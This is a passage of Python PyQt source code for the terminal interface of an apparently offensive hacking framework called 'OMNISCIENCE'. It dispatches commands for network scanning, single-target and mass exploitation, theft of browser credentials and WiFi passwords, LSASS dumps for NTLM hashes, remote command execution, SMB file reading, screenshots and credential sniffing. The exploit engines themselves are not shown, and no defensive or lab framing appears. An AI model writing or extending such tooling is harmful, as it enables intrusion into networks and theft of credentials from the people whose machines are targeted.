        left_layout.addWidget(sess_label)
        
        self.sessions_list = SessionsPanel()
        left_layout.addWidget(self.sessions_list, stretch=1)
        
        splitter.addWidget(left_panel)
        
        # ─── RIGHT PANEL: Terminal ─────────────────────────────────────────────────
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setSpacing(0)
        
        # Terminal display
        self.display = QTextEdit()
        self.display.setReadOnly(True)
        self.display.setFont(QFont("Consolas", 11))
        self.display.setStyleSheet(f"""
            QTextEdit {{
                background-color: #050505;
                color: {TEXT};
                border: 2px solid {ACCENT};
                padding: 15px;
                selection-background-color: {PURPLE};
            }}
        """)
        right_layout.addWidget(self.display, stretch=1)
        
        # Input line
        input_frame = QFrame()
        input_frame.setStyleSheet(f"background-color: {DARKER_BG}; border-top: 2px solid {ACCENT};")
        input_layout = QHBoxLayout(input_frame)
        input_layout.setContentsMargins(10, 8, 10, 8)
        
        self.prompt_label = QLabel("omnisec>")
        self.prompt_label.setStyleSheet(f"color: {PURPLE}; font-family: Consolas; font-weight: bold; font-size: 12px;")
        input_layout.addWidget(self.prompt_label)
        
        self.input_line = QLineEdit()
        self.input_line.setFont(QFont("Consolas", 12))
        self.input_line.setStyleSheet(f"color: {TEXT}; border: none; background: transparent;")
        self.input_line.returnPressed.connect(self.execute_command)
        input_layout.addWidget(self.input_line)
        
        right_layout.addWidget(input_frame)
        
        splitter.addWidget(right_panel)
        splitter.setSizes([500, 900])  # Left panel smaller
        
        main_layout.addWidget(splitter, stretch=1)
        
        # Status bar
        status = QStatusBar()
        status.setStyleSheet(f"background-color: {DARKER_BG}; color: {TEXT_DIM};")
        status.showMessage(f"Engines: {'OmniSec' if OMNISEC_AVAILABLE else ''} {'Exploit' if EXPLOIT_ENGINE_AVAILABLE else ''} {'Control' if REMOTE_CONTROL_AVAILABLE else ''} {'Intel' if INTEL_AVAILABLE else ''}")
        self.setStatusBar(status)
    
    def button_style(self, color: str) -> str:
        """Generate button stylesheet."""
        return f"""
            QPushButton {{
                background-color: {color};
                color: {DARK_BG};
                font-family: Consolas;
                font-weight: bold;
                font-size: 10px;
                padding: 6px 12px;
                border: none;
                border-radius: 3px;
            }}
            QPushButton:hover {{
                background-color: {DARK_BG};
                color: {color};
                border: 1px solid {color};
            }}
        """
    
    def apply_theme(self):
        """Apply global dark theme."""
        self.setStyleSheet(f"QMainWindow {{ background-color: {DARKER_BG}; }}")
    
    def connect_signals(self):
        """Connect UI signals."""
        pass
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # TERMINAL I/O — Command execution and display
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def display_welcome(self):
        """Display welcome banner and engine status."""
        banner = f"""
<font color='{PURPLE}' size='5'><b>OMNISCIENCE FRAMEWORK</b></font><br>
<font color='{TEXT_DIM}'>v7.1-ULTRAMAX | Production Build</font><br><br>

<font color='{ACCENT}'>[SYSTEM]</font> OmniSec Engine: <font color='{SUCCESS}'>● ONLINE</font><br>
<font color='{ACCENT}'>[SYSTEM]</font> Exploit Engine: <font color='{SUCCESS}'>● ONLINE</font><br>
<font color='{ACCENT}'>[SYSTEM]</font> Remote Control: <font color='{SUCCESS}'>● ONLINE</font><br>
<font color='{ACCENT}'>[SYSTEM]</font> Passive Intel: <font color='{SUCCESS}'>● ONLINE</font><br><br>

<font color='{GOLD}'>[READY]</font> <font color='{TEXT}'>All systems operational. Type 'help' for command list.</font><br>
<font color='{TEXT_DIM}'>----------</font><br>
"""
        self.display.append(banner)
    
    def execute_command(self):
        """Parse and execute CLI command."""
        cmd = self.input_line.text().strip()
        if not cmd:
            return
        
        self.input_line.clear()
        self.display.append(f"<font color='{ACCENT}'><b>[cmd]</b></font> <font color='white'>{cmd}</font>")
        
        parts = cmd.split()
        command = parts[0].lower()
        args = parts[1:]
        
        # Command dispatch
        result = self.dispatch_command(command, args)
        
        if result:
            self.display.append(result)
        
        self.display.moveCursor(QTextCursor.MoveOperation.End)
    
    def dispatch_command(self, command: str, args: List[str]) -> str:
        """Route commands to appropriate handlers."""
        
        # Help
        if command == 'help':
            return self.show_help()
        
        # System
        elif command in ['exit', 'quit']:
            self.close()
            return ""
        
        elif command == 'clear':
            self.display.clear()
            return ""
        
        elif command == 'status':
            return self.show_status()
        
        # Discovery
        elif command in ['scan', 'discover']:
            target = args[0] if args else None
            self.run_async_discovery(target)
            return f"<font color='{GOLD}'>[*]</font> Starting network discovery{f' on {target}' if target else ''}..."
        
        elif command == 'devices':
            return self.list_devices()
        
        elif command == 'topology':
            return "<font color='{GOLD}'>[*]</font> Topology view updated (left panel)."
        
        # Exploitation
        elif command in ['pwn', 'exploit']:
            if args:
                target = args[0]
                self.run_async_exploit(target)
                return f"<font color='{ERROR}'>[!]</font> Exploiting {target}..."
            else:
                self.run_async_exploit_all()
                return f"<font color='{ERROR}'>[!]</font> Mass exploitation started..."
        
        elif command in ['pwnall', 'attack', 'pwn-all']:
            self.run_async_exploit_all()
            return f"<font color='{ERROR}'>[!]</font> Launching full-scale attack sequence..."
        
        # Harvesting
        elif command in ['harvest', 'extract', 'omnifetch']:
            if not self.cli.current_target:
                return "<font color='{ERROR}'>[!]</font> No target selected. Use 'select <ip>' first."
            self.run_async_harvest(self.cli.current_target)
            return f"<font color='{SUCCESS}'>[*]</font> Harvesting all data from {self.cli.current_target}..."
        
        elif command in ['creds', 'browser', 'stealcreds']:
            target = args[0] if args else self.cli.current_target
            if target:
                result = self.cli.harvest_browser_creds(target)
                return self.format_harvest_result('browser', result, target)
            return "Usage: creds <target_ip>"
        
        elif command in ['wifi', 'steal-wifi']:
            target = args[0] if args else self.cli.current_target
            if target:
                result = self.cli.harvest_wifi_keys(target)
                return self.format_harvest_result('wifi', result, target)
            return "Usage: wifi <target_ip>"
        
        elif command == 'lsass-dump':
            target = args[0] if args else self.cli.current_target
            if target:
                result = self.cli.dump_lsass(target)
                return self.format_harvest_result('lsass', result, target)
            return "Usage: lsass-dump <target_ip>"
        
        # Control
        elif command == 'exec':
            if not args:
                return "Usage: exec <command>"
            if not self.cli.current_target:
                return "No target selected. Use 'select <ip>' first."
            
            cmd_str = ' '.join(args)
            result = self.cli.execute_command(self.cli.current_target, cmd_str)
            return self.format_command_result(result)
        
        elif command in ['ls', 'dir']:
            path = args[0] if args else "C:\\Users"
            if not self.cli.current_target:
                return "No target selected."
            
            files = self.cli.smb_list_files(self.cli.current_target, path)
            return self.format_file_list(files, path)
        
        elif command in ['cat', 'read']:
            if not args:
                return "Usage: cat <filepath>"
            if not self.cli.current_target:
                return "No target selected."
            
            content = self.cli.smb_read_file(self.cli.current_target, args[0])
            return content.decode(errors='replace') if content else "Failed to read file."
        
        elif command == 'screenshot':
            if not self.cli.current_target:
                return "No target selected."
            path = self.cli.take_screenshot(self.cli.current_target)
            return f"<font color='{SUCCESS}'>[+]</font> Screenshot saved: {path}" if path else "<font color='{ERROR}'>[!]</font> Screenshot failed."
        
        elif command == 'screen':
            # Alias for screenshot
            return self.dispatch_command('screenshot', args)
        
        # Passive Intel
        elif command == 'sniff':
            iface = args[0] if args else None
            result = self.cli.start_sniffing(iface)
            return f"<font color='{SUCCESS}'>[+]</font> Sniffer started on {result.get('interface', 'all')}"
        
        elif command == 'stopsniff':
            result = self.cli.stop_sniffing()
            return f"<font color='{WARNING}'>[*]</font> Sniffer stopped."
        
        elif command == 'creds':
            creds = self.cli.get_captured_credentials()
            return self.format_captured_creds(creds)
        
        elif command == 'dns-log':
            queries = self.cli.get_dns_queries()
            return self.format_dns_log(queries)
        
        # Sessions
        elif command == 'sessions':
            sessions = self.cli.get_sessions()
            return self.format_sessions_list(sessions)
        
        elif command == 'interact':
            if not args:
                return "Usage: interact <session_id>"
            # Would open interactive shell — not implemented in GUI
            return f"<font color='{WARNING}'>[*]</font> Interactive mode for {args[0]} would open in separate terminal."
        
        elif command == 'kill':
            if not args:
                return "Usage: kill <session_id>"
            return f"<font color='{WARNING}'>[*]</font> Session termination not yet implemented in GUI."
        
        # Target selection
        elif command == 'use' or command == 'select':
            if not args:
                return "Usage: select <ip>"
            self.cli.current_target = args[0]
            return f"<font color='{SUCCESS}'>[+]</font> Target set to {args[0]}"
        
        elif command == 'info':
            if not args and not self.cli.current_target:
                return "Usage: info <ip> or set target first"
            target = args[0] if args else self.cli.current_target
            info = self.cli.get_system_info(target)
            return self.format_system_info(info)
        
        # Custom shell command fallback
        else:
            result = self.cli.execute_custom(command + ' ' + ' '.join(args) if args else command)
            return result if result else "Command executed (no output)"
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # FORMATTERS — Human-readable output
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def show_help(self) -> str:
        """Display complete help."""
        help_text = f"""
<font color='{PURPLE}' size='4'><b>OMNISCIENCE COMMAND REFERENCE</b></font><br>
<font color='{TEXT_DIM}'>─────────── Discovery ───────────</font><br>
  <font color='{ACCENT}'>scan [range]</font>          Discover all devices on network<br>
  <font color='{ACCENT}'>devices</font>               List discovered devices<br>
  <font color='{ACCENT}'>topology</font>              Show network map<br>
  <font color='{ACCENT}'>select &lt;ip&gt;</font>            Set current target<br>
  <font color='{ACCENT}'>info</font>                  Show target details<br><br>

<font color='{TEXT_DIM}'>─────────── Exploitation ─────────</font><br>
  <font color='{ERROR}'>pwn &lt;ip&gt;</font>               Exploit single target<br>
  <font color='{ERROR}'>pwnall / attack</font>       Exploit all discovered<br><br>

<font color='{TEXT_DIM}'>─────────── Data Harvesting ──────</font><br>
  <font color='{SUCCESS}'>harvest / extract</font>     Extract all data from target<br>
  <font color='{SUCCESS}'>creds &lt;ip&gt;</font>             Harvest browser credentials<br>
  <font color='{SUCCESS}'>wifi &lt;ip&gt;</font>              Harvest WiFi passwords<br>
  <font color='{SUCCESS}'>lsass-dump &lt;ip&gt;</font>       Dump LSASS memory<br><br>

<font color='{TEXT_DIM}'>─────────── Remote Control ───────</font><br>
  <font color='{CYAN}'>exec &lt;cmd&gt;</font>              Execute command on target<br>
  <font color='{CYAN}'>ls [path]</font>              List remote files<br>
  <font color='{CYAN}'>cat &lt;file&gt;</font>             Read remote file<br>
  <font color='{CYAN}'>screenshot</font>             Capture desktop<br><br>

<font color='{TEXT_DIM}'>─────────── Intelligence ──────────</font><br>
  <font color='{GOLD}'>sniff [iface]</font>          Start packet capture<br>
  <font color='{GOLD}'>stopsniff</font>              Stop sniffing<br>
  <font color='{GOLD}'>creds</font>                  Show captured credentials<br>
  <font color='{GOLD}'>dns-log</font>                Show DNS queries<br><br>

<font color='{TEXT_DIM}'>─────────── Sessions ─────────────</font><br>
  <font color='{PURPLE}'>sessions</font>               List active sessions<br>
  <font color='{PURPLE}'>interact &lt;id&gt;</font>          Connect to session<br><br>

<font color='{TEXT_DIM}'>─────────── System ───────────────</font><br>
  <font color='{TEXT}'>help</font>                   Show this help<br>
  <font color='{TEXT}'>clear</font>                  Clear terminal<br>
  <font color='{TEXT}'>status</font>                 Show engine status<br>
  <font color='{TEXT}'>exit</font>                   Exit application
"""
        return help_text
    
    def format_system_info(self, info: Dict) -> str:
        """Format system info output."""
        if 'error' in info:
            return f"<font color='{ERROR}'>Error: {info['error']}</font>"
        
        output = f"""<font color='{ACCENT}'>═══ SYSTEM INFORMATION ═══</font><br>
<b>OS:</b> {info.get('os_name', 'Unknown')}<br>
<b>Architecture:</b> {info.get('os_architecture', 'Unknown')}<br>
<b>Computer Name:</b> {info.get('computer_name', 'Unknown')}<br>
<b>Domain:</b> {info.get('domain', 'Unknown')}<br>
<b>Logged Users:</b> {', '.join(info.get('logged_users', ['None']))}<br>
<b>Processor:</b> {info.get('processor', 'Unknown')}<br>
<b>RAM:</b> {info.get('ram_total', 'Unknown')}<br>
<b>Uptime:</b> {info.get('uptime', 'Unknown')}<br>"""
        return output
    
    def format_file_list(self, files: List[Dict], path: str) -> str:
        """Format SMB file listing."""
        if not files:
            return f"<font color='{WARNING}'>Directory empty or inaccessible: {path}</font>"
        
        output = f"<font color='{ACCENT}'>═══ {path} ═══</font><br>"
        output += f"{'Type':<4} {'Size':<12} {'Name':<40}<br>"
        output += f"<font color='{TEXT_DIM}'>{'─'*60}</font><br>"
        
        for f in files[:50]:  # Limit display
            icon = "[D]" if f.get('dir') else "   "
            size = self._format_size(f.get('size', 0))
            name = f.get('name', '?')[:38]
            output += f"<font color='{TEXT}'>{icon}</font> <font color='{TEXT_DIM}'>{size:<12}</font> {name}<br>"
        
        if len(files) > 50:
            output += f"... and {len(files)-50} more items<br>"
        
        return output
    
    def _format_size(self, size: int) -> str:
        """Format bytes to human readable."""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024:
                return f"{size:.1f}{unit}"
            size /= 1024
        return f"{size:.1f}TB"
    
    def format_harvest_result(self, harvest_type: str, result: Dict, target: str) -> str:
        """Format credential harvesting output."""
        if 'error' in result:
            return f"<font color='{ERROR}'>[!] Harvest failed: {result['error']}</font>"
        
        if harvest_type == 'browser':
            pwd_list = result.get('passwords', [])
            if pwd_list:
                output = f"<font color='{SUCCESS}'>[+]</font> Browser credentials from {target}:<br>"
                for cred in pwd_list[:20]:
                    output += f"  • {cred['browser']}: {cred['url']}<br>    <font color='{TEXT_DIM}'>User: {cred['user']} Pass: {cred['password']}</font><br>"
                return output
            else:
                return f"<font color='{WARNING}'>[-] No browser credentials found on {target}</font>"
        
        elif harvest_type == 'wifi':
            networks = result.get('networks', {})
            if networks:
                output = f"<font color='{SUCCESS}'>[+]</font> WiFi networks from {target}:<br>"
                for ssid, pwd in networks.items():
                    output += f"  • <b>{ssid}</b>: {pwd}<br>"
                return output
            else:
                return f"<font color='{WARNING}'>[-] No WiFi profiles found on {target}</font>"
        
        elif harvest_type == 'lsass':
            hashes = result.get('hashes', [])
            if result.get('success') and hashes:
                output = f"<font color='{SUCCESS}'>[+]</font> LSASS dump successful. Extracted {len(hashes)} hashes:<br>"
                for h in hashes[:20]:
                    output += f"  • {h.get('user','?')}: {h.get('ntlm','?')}<br>"
                return output
            else:
                return f"<font color='{ERROR}'>[!] LSASS dump failed</font>"
        
        return f"<font color='{SUCCESS}'>[+]</font> Harvest complete for {target}"
    
    def format_captured_creds(self, creds: List[Dict]) -> str:
        """Format captured credentials from sniffing."""
        if not creds:
            return "<font color='{WARNING}'>No credentials captured yet.</font>"
        
        output = f"<font color='{ACCENT}'>═══ CAPTURED CREDENTIALS ({len(creds)}) ═══</font><br>"
        for cred in creds:
            output += f"<font color='{GOLD}'>[{cred['time'].strftime('%H:%M:%S')}]</font> {cred['source']}<br>"
            output += f"  <font color='{TEXT_DIM}'>{cred['data'][:80]}</font><br>"
        return output
    
    def format_dns_log(self, queries: List[Dict]) -> str:
        """Format DNS query log."""
        if not queries:
            return "<font color='{WARNING}'>No DNS queries logged.</font>"
        
        output = f"<font color='{ACCENT}'>═══ DNS QUERIES ═══</font><br>"
        for q in queries[-20:]:
            output += f"<font color='{GOLD}'>[{q['time'].strftime('%H:%M:%S')}]</font> {q['src']} → {q['query']}<br>"
        return output
    
    def format_sessions_list(self, sessions: List[Dict]) -> str:
        """Format active sessions."""
        if not sessions:
            return "<font color='{WARNING}'>No active sessions.</font>"
        
        output = f"<font color='{ACCENT}'>═══ ACTIVE SESSIONS ({len(sessions)}) ═══</font><br>"
        output += f"{'ID':<12} {'IP':<16} {'Platform':<10} {'User':<15} {'Privilege':<10}<br>"
        output += f"<font color='{TEXT_DIM}'>{'─'*80}</font><br>"
        
        for s in sessions:
            output += f"<font color='{SUCCESS}'>●</font> {s.get('session_id','')[:12]:<12} "
            output += f"{s.get('ip',''):<16} "
            output += f"{s.get('platform',''):<10} "
            output += f"{s.get('username',''):<15} "
            output += f"{s.get('privilege',''):<10}<br>"
        
        return output
    
    def format_command_result(self, result: Dict) -> str:
        """Format command execution output."""
        if 'error' in result:
            return f"<font color='{ERROR}'>Error: {result['error']}</font>"
        
        output = result.get('output', '')
        if output:
            # Escape HTML special chars
            output = output.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
            return f"<font color='{TEXT}'>{output}</font>"
        else:
            return f"<font color='{SUCCESS}'>[+] Command executed successfully (no output)</font>"
    
    def list_devices(self) -> str:
        """List all discovered devices."""
        devices = self.cli.get_devices()
        if not devices:
            return "<font color='{WARNING}'>No devices discovered. Run 'scan' first.</font>"
        
        output = f"<font color='{ACCENT}'>═══ DISCOVERED DEVICES ({len(devices)}) ═══</font><br>"
        output += f"<font color='{TEXT_DIM}'>{'IP':<16} {'Hostname':<20} {'OS':<15} {'Type':<10} {'Ports':<6} {'Status'}</font><br>"
        output += f"<font color='{TEXT_DIM}'>{'─'*90}</font><br>"
        
        for dev in devices:
            status = "COMPR" if dev.get('is_compromised') else ("ACCESS" if dev.get('can_access') else "DISC")
            status_color = SUCCESS if dev.get('is_compromised') else (WARNING if dev.get('can_access') else TEXT)
            
            output += f"<font color='{TEXT}'>{dev.get('ip',''):<16}</font> "
            output += f"{dev.get('hostname','')[:19]:<20} "
            output += f"{dev.get('os','Unknown')[:14]:<15} "
            output += f"{dev.get('device_type','unknown')[:9]:<10} "
            output += f"{str(len(dev.get('open_ports',[]))):<6} "
            output += f"<font color='{status_color}'>{status}</font><br>"
        
        return output
    
    def show_status(self) -> str:
        """Show engine status."""
        stats = self.cli.get_stats()
        output = f"""<font color='{ACCENT}'>═══ ENGINE STATUS ═══</font><br>
<font color='{SUCCESS}'>● OmniSec Engine:</font> {'Active' if OMNISEC_AVAILABLE else 'Offline'}<br>
<font color='{SUCCESS}'>● Exploit Engine:</font> {'Active' if EXPLOIT_ENGINE_AVAILABLE else 'Offline'}<br>
<font color='{SUCCESS}'>● Remote Control:</font> {'Active' if REMOTE_CONTROL_AVAILABLE else 'Offline'}<br>
<font color='{SUCCESS}'>● Passive Intel:</font> {'Active' if INTEL_AVAILABLE else 'Offline'}<br><br>

<font color='{ACCENT}'>═══ STATISTICS ═══</font><br>
<b>Discovered:</b> {stats.get('discovered',0)} devices<br>
<b>Compromised:</b> {stats.get('compromised',0)} hosts<br>
<b>Active Sessions:</b> {stats.get('active_sessions',0)}<br>
<b>Credentials:</b> {stats.get('credentials',0)} stored<br>
<b>Data Extracted:</b> {stats.get('data_extracted',0)} packages<br>
<b>Exploits Run:</b> {stats.get('exploits_run',0)}
"""
        return output
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # ASYNC OPERATIONS — Threaded execution
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def run_async_discovery(self, target_range: str = None):
        """Run network discovery in background thread."""
        worker = DiscoveryWorker(self.cli, target_range)
        worker.progress.connect(lambda msg: self.display.append(f"<font color='{GOLD}'>[*]</font> {msg}"))
        worker.finished.connect(self.on_discovery_complete)
        worker.start()
        self.workers.append(worker)
    
    def on_discovery_complete(self, result: Dict):
        """Handle discovery completion."""
        if 'error' in result:
            self.display.append(f"<font color='{ERROR}'>[!] Discovery failed: {result['error']}</font>")
            return
        
        count = result.get('count', 0)
        duration = result.get('duration', 0)
        self.display.append(f"<font color='{SUCCESS}'>[+]</font> Discovery complete: {count} devices found in {duration:.1f}s")
        
        # Update topology
        devices = result.get('devices', [])
        self.topology.update_devices(devices)
    
    def run_async_exploit(self, target_ip: str = None):
        """Run exploit in background."""
        worker = ExploitWorker(self.cli, target_ip)
        worker.progress.connect(lambda msg: self.display.append(f"<font color='{ERROR}'>[!]</font> {msg}"))
        worker.finished.connect(self.on_exploit_complete)
        worker.start()
        self.workers.append(worker)
    
    def on_exploit_complete(self, result: Dict):
        """Handle exploit completion."""
        if 'error' in result:
            self.display.append(f"<font color='{ERROR}'>[!] Exploit error: {result['error']}</font>")
            return
        
        if result.get('success'):
            target = result.get('details', {}).get('ip', 'target')
            method = result.get('method', 'unknown')
            self.display.append(f"<font color='{SUCCESS}'>[+]</font> EXPLOITED {target} via {method}")
        else:
            self.display.append(f"<font color='{ERROR}'>[-]</font> Exploit failed for target")
        
        # Refresh displays
        self.refresh_all()
    
    def run_async_exploit_all(self):
        """Run mass exploitation."""
        worker = ExploitWorker(self.cli, None)
        worker.progress.connect(lambda msg: self.display.append(f"<font color='{ERROR}'>[!]</font> {msg}"))
        worker.finished.connect(self.on_exploit_all_complete)
        worker.start()
        self.workers.append(worker)
    
    def on_exploit_all_complete(self, result: Dict):
        """Handle mass exploit completion."""
        if 'error' in result:
            self.display.append(f"<font color='{ERROR}'>[!] Error: {result['error']}</font>")
            return
        
        exploited = result.get('exploited', [])
        failed = result.get('failed', [])
        total = result.get('total', 0)
        
        self.display.append(f"<font color='{SUCCESS}'>[+]</font> Mass exploitation complete!")
        self.display.append(f"    Exploited: <font color='{SUCCESS}'>{len(exploited)}</font> / Total: {total}")
        self.display.append(f"    Failed: <font color='{ERROR}'>{len(failed)}</font>")
        
        for exp in exploited[:10]:
            self.display.append(f"      ● {exp['ip']} via {exp['method']}")
        
        if len(exploited) > 10:
            self.display.append(f"      ... and {len(exploited)-10} more")
        
        self.refresh_all()
    
    def run_async_harvest(self, target_ip: str):
        """Run harvesting in background."""
        worker = HarvestWorker(self.cli, target_ip)
        worker.progress.connect(lambda msg: self.display.append(f"<font color='{SUCCESS}'>[*]</font> {msg}"))
        worker.finished.connect(self.on_harvest_complete)
        worker.start()
        self.workers.append(worker)
    
    def on_harvest_complete(self, result: Dict):
        """Handle harvest completion."""
        if 'error' in result:
            self.display.append(f"<font color='{ERROR}'>[!] Harvest failed: {result['error']}</font>")
            return
        
        # Count harvested items
        creds_count = len(result.get('credentials', {}).get('passwords', []))
        wifi_count = len(result.get('wifi', {}).get('networks', {}))
        hash_count = len(result.get('hashes', {}).get('hashes', []))
        
        self.display.append(f"<font color='{SUCCESS}'>[+]</font> Harvest complete!")
        self.display.append(f"    Browser credentials: {creds_count}")
        self.display.append(f"    WiFi passwords: {wifi_count}")
        self.display.append(f"    NT hashes: {hash_count}")
        
        self.refresh_all()
    
    def harvest_selected(self):
        """Harvest current target."""
        if not self.cli.current_target:
            self.display.append("<font color='{WARNING}'>No target selected.</font>")
            return
        
        self.run_async_harvest(self.cli.current_target)
    
    def toggle_sniffing(self):
        """Toggle packet sniffing."""
        if self.intel and hasattr(self.intel, 'sniffing') and self.intel.sniffing:
            result = self.cli.stop_sniffing()
            self.display.append(f"<font color='{WARNING}'>[*]</font> {result.get('status', 'Sniffer stopped')}")
        else:
            result = self.cli.start_sniffing()
            self.display.append(f"<font color='{SUCCESS}'>[+]</font> Sniffer started on {result.get('interface', 'all')}")
    
    # ═══════════════════════════════════════════════════════════════════════════════
    # REAL-TIME REFRESH — Update all panels
    # ═══════════════════════════════════════════════════════════════════════════════
    
    def refresh_all(self):
        """Refresh all UI components with latest data."""
        # Update devices table content
        devices = self.cli.get_devices()
        
        # Also pull from engines directly for most recent
        if self.cli.sec_engine:
            devices = [self.cli._device_to_dict(d) for d in self.cli.sec_engine.devices.values()]
        elif self.cli.access_engine:
            devices = [self.cli._udevice_to_dict(d) for d in self.cli.access_engine.devices.values()]
        
        # Update topology
        self.topology.update_devices(devices)
        
        # Update sessions
        sessions = self.cli.get_sessions()
        self.sessions_list.update_sessions(sessions)
        
        # Update stats
        stats = self.cli.get_stats()
        self.stats_panel.update_stats(stats)
    
    def closeEvent(self, event):
        """Clean shutdown."""
        # Stop sniffing
        if self.cli.intel:
            self.cli.intel.stop_sniffing()
        
        # Wait for workers
        for worker in self.workers:
            if worker.isRunning():
                worker.quit()
                worker.wait(1000)
        
        event.accept()


# ═══════════════════════════════════════════════════════════════════════════════
# APPLICATION ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    """Launch standalone CLI window."""
    app = QApplication(sys.argv)
    
    # Set application-wide font
    font = QFont("Consolas", 10)
    app.setFont(font)
    
    window = OmniSecCLIWindow()
    window.show()
    
    sys.exit(app.exec())

if __name__ == '__main__':
    main()
